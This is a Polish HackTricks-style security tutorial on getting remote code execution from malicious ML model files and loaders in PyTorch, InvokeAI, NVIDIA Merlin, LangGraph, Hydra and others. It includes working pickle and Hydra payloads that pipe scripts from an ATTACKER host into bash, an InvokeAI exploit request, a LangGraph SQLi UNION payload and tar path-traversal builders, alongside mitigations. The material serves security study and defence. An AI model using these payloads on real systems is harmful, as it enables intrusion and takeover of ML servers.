# RCE modeli

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli do RCE

Modele Machine Learning są zwykle udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch itd. Modele te mogą być ładowane na maszynach deweloperów lub w systemach produkcyjnych w celu ich użycia. Zwykle modele nie powinny zawierać złośliwego kodu, ale w niektórych przypadkach model może zostać użyty do wykonania dowolnego kodu w systemie jako zamierzona funkcja lub z powodu podatności w bibliotece ładowania modeli.

W chwili pisania tego tekstu przykładami tego typu podatności są:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Złośliwy pickle w checkpointcie modelu prowadzi do wykonania kodu (z pominięciem zabezpieczenia `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + pobranie złośliwego modelu powoduje wykonanie kodu; Java deserialization RCE w management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Niezaufany checkpoint uruchamia pickle reducer podczas `load_model_trainer_states_from_checkpoint` → wykonanie kodu w workerze ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kontrolowany przez użytkownika klucz `filter` wstrzykuje składnię SQL/JSON-path, `UNION SELECT` tworzy fałszywy wiersz checkpointu, a następnie deserializacja `msgpack` importuje i wywołuje wybrany przez atakującego kod Python | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Ładowanie modelu z YAML używa `yaml.unsafe_load` (code exec) <br> Ładowanie modelu z warstwą **Lambda** wykonuje dowolny kod Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Spreparowany model `.tflite` powoduje integer overflow → uszkodzenie sterty (potencjalne RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu przez `joblib.load` wykonuje pickle z payloadem `__reduce__` atakującego                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Domyślne `numpy.load` pozwalało na tablice obiektów pickle – złośliwy `.npy/.npz` uruchamia code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Ścieżka external-weights modelu ONNX może wyjść poza katalog (odczyt dowolnych plików) <br> Złośliwe archiwum tar modelu ONNX może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model z custom operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modelu mogą nadużywać logiki w celu wykonywania niezamierzonych obliczeń   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Użycie model-load API przy włączonej opcji `--model-control` umożliwia path traversal ścieżki względnej w celu zapisu plików (np. nadpisania `.bashrc` dla RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Nieprawidłowy plik modelu GGUF powoduje heap buffer overflows w parserze, umożliwiając wykonanie dowolnego kodu w systemie ofiary                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Złośliwy model HDF5 (`.h5`) z warstwą Lambda nadal wykonuje kod podczas ładowania (Keras safe_mode nie obejmuje starego formatu – „downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Wiele narzędzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykona dowolny kod osadzony w plikach modeli, jeśli nie zostaną zastosowane mechanizmy ochronne | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Kontrolowane przez atakującego metadata/config ustawia `_target_` na dowolny callable (np. `builtins.exec`) → wykonywany podczas ładowania, nawet przy użyciu „bezpiecznych” formatów (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ponadto istnieją modele oparte na python pickle, takie jak modele używane przez [PyTorch](https://github.com/pytorch/pytorch/security), które mogą zostać użyte do wykonania dowolnego kodu w systemie, jeśli nie zostaną załadowane z `weights_only=True`. Dlatego każdy model oparty na pickle może być szczególnie podatny na tego typu ataki, nawet jeśli nie został wymieniony w powyższej tabeli.

### Metadata Hydra → RCE (działa nawet z safetensors)

`hydra.utils.instantiate()` importuje i wywołuje dowolny dotted `_target_` w obiekcie konfiguracji/metadata. Gdy biblioteki przekazują **niezaufane metadata modelu** do `instantiate()`, atakujący może dostarczyć callable i argumenty, które zostaną natychmiast wykonane podczas ładowania modelu (bez konieczności użycia pickle).<sup>[[12]](#references)</sup>

Przykład payloadu (działa w `.nemo` `model_config.yaml`, repo `config.json` lub `__metadata__` wewnątrz `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Najważniejsze informacje:
- Wywoływane przed inicjalizacją modelu w `restore_from/from_pretrained` NeMo, coderach HuggingFace uni2TS oraz loaderach FlexTok.
- String block-list Hydra można obejść za pomocą alternatywnych ścieżek importu (np. `enum.bltns.eval`) lub nazw rozwiązywanych przez aplikację (np. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok parsuje również metadane zapisane jako string za pomocą `ast.literal_eval`, umożliwiając DoS (gwałtowny wzrost użycia CPU/pamięci) przed wywołaniem Hydra.

### 🆕  RCE w InvokeAI za pośrednictwem `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny open-source’owy interfejs webowy dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają REST endpoint `/api/v2/models/install`, który pozwala użytkownikom pobierać i ładować modele z dowolnych URL-i.<sup>[[1]](#references)</sup>

Wewnętrznie endpoint ostatecznie wywołuje:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Gdy dostarczony plik jest **checkpointem PyTorch (`*.ckpt`)**, `torch.load` wykonuje **deserializację pickle**. Ponieważ zawartość pochodzi bezpośrednio z kontrolowanego przez użytkownika adresu URL, attacker może osadzić w checkpointcie złośliwy obiekt z niestandardową metodą `__reduce__`; metoda ta jest wykonywana **podczas deserializacji**, co prowadzi do **remote code execution (RCE)** na serwerze InvokeAI.

Podatności nadano identyfikator **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Instrukcja Exploitation

1. Utwórz złośliwy checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Umieść `payload.ckpt` na kontrolowanym przez siebie serwerze HTTP (np. `http://ATTACKER/payload.ckpt`).
3. Wywołaj podatny endpoint (uwierzytelnianie nie jest wymagane):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Gdy InvokeAI pobiera plik, wywołuje `torch.load()` → gadget `os.system` zostaje uruchomiony, a attacker uzyskuje code execution w kontekście procesu InvokeAI.

Gotowy exploit: moduł **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje cały przepływ.<sup>[[3]](#references)</sup>

#### Warunki

•  InvokeAI 5.3.1-5.4.2 (domyślna flaga skanowania **false**)
•  `/api/v2/models/install` jest osiągalny dla attackera
•  Proces ma uprawnienia do wykonywania poleceń powłoki

#### Środki zaradcze

* Zaktualizuj do **InvokeAI ≥ 5.4.3** – patch ustawia domyślnie `scan=True` i wykonuje skanowanie pod kątem malware przed deserializacją.
* Podczas programowego ładowania checkpointów używaj `torch.load(file, weights_only=True)` lub nowego helpera [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Wymuś allow-listy / podpisy dla źródeł modeli i uruchamiaj usługę z minimalnymi uprawnieniami.

> ⚠️ Pamiętaj, że każdy format oparty na Python pickle (w tym wiele plików `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny podczas deserializacji z niezaufanych źródeł.

---

Przykład doraźnego środka zaradczego, jeśli musisz zachować starsze wersje InvokeAI działające za reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE przez niebezpieczne `torch.load` (CVE-2025-23298)

NVIDIA Transformers4Rec (część Merlin) udostępniał niebezpieczny loader checkpointów, który bezpośrednio wywoływał `torch.load()` na ścieżkach podanych przez użytkownika. Ponieważ `torch.load` opiera się na Python `pickle`, kontrolowany przez atakującego checkpoint może wykonywać dowolny kod za pośrednictwem reducera podczas deserializacji.<sup>[[5]](#references)</sup>

Podatna ścieżka (przed poprawką): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Dlaczego prowadzi to do RCE: W Python pickle obiekt może definiować reducer (`__reduce__`/`__setstate__`), który zwraca callable i argumenty. Callable jest wykonywany podczas unpicklingu. Jeśli taki obiekt znajduje się w checkpoincie, zostanie uruchomiony przed użyciem jakichkolwiek wag.

Minimalny przykład złośliwego checkpointu:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Wektory dostarczenia i zakres rażenia:
- Zainfekowane trojanem checkpoints/models udostępniane za pośrednictwem repozytoriów, buckets lub artifact registries
- Zautomatyzowane pipeline'y resume/deploy, które automatycznie ładują checkpoints
- Wykonanie odbywa się wewnątrz workers training/inference, często z podwyższonymi uprawnieniami (np. jako root w kontenerach)

Naprawa: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zastąpił bezpośrednie wywołanie `torch.load()` ograniczonym deserializerem z allow-listą, zaimplementowanym w `transformers4rec/utils/serialization.py`. Nowy loader weryfikuje typy/pola i uniemożliwia wywoływanie arbitrary callables podczas ładowania.<sup>[[7]](#references)</sup>

Wskazówki defensive dotyczące PyTorch checkpoints:
- Nie wykonuj unpickle niezaufanych danych. Jeśli to możliwe, preferuj nie-wykonywalne formaty, takie jak [Safetensors](https://huggingface.co/docs/safetensors/index) lub ONNX.
- Jeśli musisz używać PyTorch serialization, upewnij się, że `weights_only=True` (obsługiwane w nowszych wersjach PyTorch) lub użyj custom allow-listed unpicklera podobnego do patcha Transformers4Rec.
- Wymuś weryfikację provenance/signatures modelu i uruchamiaj deserialization w sandboxie (seccomp/AppArmor; użytkownik non-root; ograniczony FS i brak network egress).
- Monitoruj nieoczekiwane child processes uruchamiane przez ML services w czasie ładowania checkpointu; śledź użycie `torch.load()`/`pickle`.

Referencje POC oraz vulnerable/patch:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Przykład – tworzenie malicious modelu PyTorch

- Utwórz model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Załaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserializacja Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD udostępnia endpoint `resnet`, który deserializuje dane kontrolowane przez użytkownika. ZDI potwierdziło, że zdalny atakujący może nakłonić ofiarę do załadowania złośliwej strony/pliku, spowodować przesłanie spreparowanego serializowanego bloba do tego endpointu i uruchomić deserializację z uprawnieniami `root`, prowadząc do pełnego przejęcia systemu.

Przebieg exploita odzwierciedla typowe nadużycie `pickle`:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Każdy gadget dostępny podczas deserializacji (konstruktory, `__setstate__`, callbacki frameworka itp.) może zostać uzbrojony w ten sam sposób, niezależnie od tego, czy transportem był HTTP, WebSocket czy plik umieszczony w monitorowanym katalogu.



### LangGraph checkpointer SQLi → MessagePack RCE

Ten łańcuch ataku jest interesujący, ponieważ atakujący **nie musi przesyłać złośliwego pliku modelu**. Zamiast tego aplikacja udostępnia **API persistence dla AI-agenta** (`get_state_history(..., filter=...)`), a dane wejściowe użytkownika trafiają do query buildera checkpointera.

#### 1. Structural SQLi w filtrach metadanych

Podatny wzorzec SQLite wyglądał następująco:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Wartość jest bindowana później, ale `query_key` jest konkatenowany do **stringa ścieżki JSON**, więc znak `'` wewnątrz klucza słownika wyprowadza zapytanie poza `'$.{query_key}'` i umożliwia SQL injection. Ta sama zasada dotyczy **ścieżek JSON, identyfikatorów, operatorów, `LIMIT` oraz pól TTL**: placeholdery chronią wyłącznie wartości, a nie strukturalną składnię zapytania.

#### 2. `UNION SELECT` może kierować dane do downstream sinks, a nie tylko służyć do kradzieży danych

Zapytanie zwraca `type` oraz zserializowane bajty `checkpoint`, które są później wykorzystywane jako:
```python
self.serde.loads_typed((type, checkpoint))
```
Oznacza to, że SQLi w klauzuli `WHERE` może wstrzyknąć **fałszywy wiersz wyniku**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Jeśli późniejszy kod parsuje, deserializuje, zapisuje lub wykonuje dowolną wybraną kolumnę, zmapuj te kolumny do odpowiednich sinków. W tym przypadku fałszywy wiersz zamienia SQLi w **deserializację kontrolowaną przez atakującego**.

#### 3. Niebezpieczne hooki rozszerzeń MessagePack są równoważne gadgetom kodu

Ścieżka `msgpack` w LangGraph używała niestandardowego hooka rozszerzenia, który rozpakowywał zagnieżdżoną krotkę i wykonywał:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Zatem obiekt rozszerzenia MessagePack kodujący coś równoważnego `("os", "system", "id > /tmp/pwned")` importuje `os`, rozwiązuje `system` i uruchamia polecenie. Podczas przeglądania frameworków AI sprawdzaj **niestandardowe revivery MessagePack/JSON/pickle** pod kątem dynamicznych importów, refleksji lub dowolnego wywoływania callable.

#### 4. Praktyczny schemat audytu frameworków agentowych

Sprawdź wszelkie dane wejściowe kontrolowane przez użytkownika, które trafiają do:
- API historii stanu / pamięci / odtwarzania / listowania checkpointów
- konstruktorów ustrukturyzowanych filtrów generujących fragmenty zapytań SQL lub Redis
- niestandardowych deserializatorów (`pickle`, `msgpack`, hooków obiektów `json`, konstruktorów YAML)
- ścieżek odzyskiwania, które ufają wierszom zwracanym przez warstwę persystencji

Ten konkretny łańcuch dotyczył self-hosted wdrożeń LangGraph wykorzystujących checkpointery **SQLite** lub **Redis**, gdy niezaufani użytkownicy mogli kontrolować `filter`. W ujawnieniu wskazano następujące poprawione wersje: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` oraz `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modele do Path Traversal

Jak wspomniano w [**tym wpisie na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne frameworki AI bazuje na archiwach, zwykle `.zip`. Dlatego możliwe może być wykorzystanie tych formatów do przeprowadzenia ataków Path Traversal, pozwalających na odczyt dowolnych plików z systemu, w którym ładowany jest model.<sup>[[16]](#references)</sup>

Na przykład za pomocą poniższego kodu można utworzyć model, który podczas ładowania utworzy plik w katalogu `/tmp`:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Lub za pomocą poniższego kodu możesz utworzyć model, który po załadowaniu utworzy dowiązanie symboliczne do katalogu `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Dogłębna analiza: deserializacja Keras .keras i wyszukiwanie gadgetów

Aby uzyskać szczegółowy przewodnik po wewnętrznych mechanizmach .keras, RCE przez warstwę Lambda, problemie arbitrary import w wersjach ≤ 3.8 oraz wyszukiwaniu gadgetów po poprawce w obrębie allowlist, zobacz:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referencje

- [1] [Blog OffSec – „CVE-2024-12029 – Deserializacja niezaufanych danych w InvokeAI”](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit poprawki InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacja modułu Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – kwestie bezpieczeństwa dotyczące torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – CVE-2025-23298: uzyskiwanie Remote Code Execution w NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Advisory ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit poprawki Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Podatny loader sprzed poprawki (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader po poprawce (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution z użyciem nowoczesnych formatów i bibliotek AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Dokumentacja Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit Hydra block-list (ostrzeżenie dotyczące RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Od SQLi do RCE: wykorzystywanie Checkpointera LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Wykorzystanie błędów Archive Slip do zdobywania wartościowych bounty AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
